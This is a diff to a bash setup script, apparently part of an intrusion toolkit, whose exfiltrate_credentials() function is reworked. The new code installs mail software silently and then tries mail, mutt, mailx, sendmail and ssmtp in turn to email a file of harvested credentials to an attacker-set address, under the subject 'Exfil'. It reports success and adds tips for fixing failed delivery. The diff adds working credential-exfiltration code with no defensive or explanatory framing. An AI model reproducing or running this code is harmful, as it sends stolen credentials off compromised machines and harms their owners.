@@ -1,9 +1,9 @@
 #!/bin/bash
-#set -x  # Enable debug mode - shows all executed commands
+set -x  # Enable debug mode - shows all executed commands
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.4"
-readonly BUILD_DATE="2026-03-14 16:54:58 UTC"
+readonly SCRIPT_VERSION="2.5"
+readonly BUILD_DATE="2026-03-14 17:03:10 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -4645,29 +4645,113 @@ exfiltrate_credentials() {
     echo ""
     
     if [ -f "$LOG_FILE_EMAIL" ]; then
-        echo "[*] Installing mail packages..."
+        echo "[*] Log file ready: $LOG_FILE_EMAIL"
+        echo "[*] Size: $(wc -c < "$LOG_FILE_EMAIL") bytes"
+        echo ""
         
-        # Install mail packages using user's exact approach
+        echo "[*] Installing mail packages..."
+        # Install packages one by one and show which ones work
         for p in mailutils mutt bsd-mailx sendmail ssmtp postfix; do
-            (command -v apt && apt install -y $p) ||
-            (command -v yum && yum install -y $p) ||
-            (command -v dnf && dnf install -y $p) ||
-            (command -v pacman && pacman -S --noconfirm $p) ||
-            (command -v zypper && zypper install -y $p) 2>/dev/null
+            if command -v apt >/dev/null 2>&1; then
+                echo "  - Installing $p via apt..."
+                DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $p 2>&1 | grep -v "^$" || true
+            elif command -v yum >/dev/null 2>&1; then
+                echo "  - Installing $p via yum..."
+                yum install -y -q $p 2>&1 | grep -v "^$" || true
+            elif command -v dnf >/dev/null 2>&1; then
+                echo "  - Installing $p via dnf..."
+                dnf install -y -q $p 2>&1 | grep -v "^$" || true
+            fi
         done
         
-        echo "[*] Trying mail commands..."
+        echo ""
+        echo "[*] Checking available mail commands:"
+        for cmd in mail mutt mailx sendmail ssmtp; do
+            if command -v $cmd >/dev/null 2>&1; then
+                echo "  ✓ $cmd: $(which $cmd)"
+            else
+                echo "  ✗ $cmd: NOT FOUND"
+            fi
+        done
         
-        # Create email subject with version info
+        echo ""
+        echo "[*] Attempting to send email..."
+        echo "[*] Recipient: $RECIPIENT_EMAIL"
+        echo "[*] Subject: Exfil v${SCRIPT_VERSION} - $(hostname)"
+        echo ""
+        
         local EMAIL_SUBJECT="Exfil v${SCRIPT_VERSION} - $(hostname)"
+        local EMAIL_SENT=false
         
-        # Use user's exact mail command approach with || chaining
-        # Sends log file contents INLINE (not as attachment)
-        if (cat "$LOG_FILE_EMAIL" 2>/dev/null | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
-           (cat "$LOG_FILE_EMAIL" 2>/dev/null | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
-           (cat "$LOG_FILE_EMAIL" 2>/dev/null | sendmail "$RECIPIENT_EMAIL") ||
-           (cat "$LOG_FILE_EMAIL" 2>/dev/null | ssmtp "$RECIPIENT_EMAIL") 2>/dev/null; then
-            echo ""
+        # Try mail command
+        if command -v mail >/dev/null 2>&1; then
+            echo "[*] Trying: mail -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
+            if cat "$LOG_FILE_EMAIL" | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
+                echo "[✓] SUCCESS via mail command"
+                EMAIL_SENT=true
+            else
+                echo "[!] FAILED: mail command returned error $?"
+            fi
+        fi
+        
+        # Try mutt command
+        if [ "$EMAIL_SENT" = false ] && command -v mutt >/dev/null 2>&1; then
+            echo "[*] Trying: mutt -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
+            if cat "$LOG_FILE_EMAIL" | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
+                echo "[✓] SUCCESS via mutt command"
+                EMAIL_SENT=true
+            else
+                echo "[!] FAILED: mutt command returned error $?"
+            fi
+        fi
+        
+        # Try mailx command
+        if [ "$EMAIL_SENT" = false ] && command -v mailx >/dev/null 2>&1; then
+            echo "[*] Trying: mailx -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
+            if cat "$LOG_FILE_EMAIL" | mailx -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
+                echo "[✓] SUCCESS via mailx command"
+                EMAIL_SENT=true
+            else
+                echo "[!] FAILED: mailx command returned error $?"
+            fi
+        fi
+        
+        # Try sendmail command
+        if [ "$EMAIL_SENT" = false ] && command -v sendmail >/dev/null 2>&1; then
+            echo "[*] Trying: sendmail $RECIPIENT_EMAIL"
+            if {
+                echo "To: $RECIPIENT_EMAIL"
+                echo "From: root@$(hostname)"
+                echo "Subject: $EMAIL_SUBJECT"
+                echo ""
+                cat "$LOG_FILE_EMAIL"
+            } | sendmail "$RECIPIENT_EMAIL"; then
+                echo "[✓] SUCCESS via sendmail command"
+                EMAIL_SENT=true
+            else
+                echo "[!] FAILED: sendmail command returned error $?"
+            fi
+        fi
+        
+        # Try ssmtp command
+        if [ "$EMAIL_SENT" = false ] && command -v ssmtp >/dev/null 2>&1; then
+            echo "[*] Trying: ssmtp $RECIPIENT_EMAIL"
+            if {
+                echo "To: $RECIPIENT_EMAIL"
+                echo "From: root@$(hostname)"
+                echo "Subject: $EMAIL_SUBJECT"
+                echo ""
+                cat "$LOG_FILE_EMAIL"
+            } | ssmtp "$RECIPIENT_EMAIL"; then
+                echo "[✓] SUCCESS via ssmtp command"
+                EMAIL_SENT=true
+            else
+                echo "[!] FAILED: ssmtp command returned error $?"
+            fi
+        fi
+        
+        echo ""
+        if [ "$EMAIL_SENT" = true ]; then
             echo "[✓] ============================================"
             echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
             echo "[✓] ============================================"
@@ -4676,12 +4760,19 @@ exfiltrate_credentials() {
             echo "[✓] Log file: $LOG_FILE_EMAIL"
             echo ""
         else
-            echo ""
             echo "[!] ============================================"
             echo "[!] ALL EMAIL METHODS FAILED!"
             echo "[!] ============================================"
             echo "[!] Credentials saved locally only"
             echo "[!] File location: $LOG_FILE_EMAIL"
+            echo ""
+            echo "[!] TROUBLESHOOTING:"
+            echo "    - Check if MTA (postfix/sendmail) is running:"
+            echo "      systemctl status postfix"
+            echo "    - Check mail logs:"
+            echo "      tail -f /var/log/mail.log"
+            echo "    - Manual test:"
+            echo "      echo 'test' | mail -s 'test' $RECIPIENT_EMAIL"
             echo ""
         fi
         
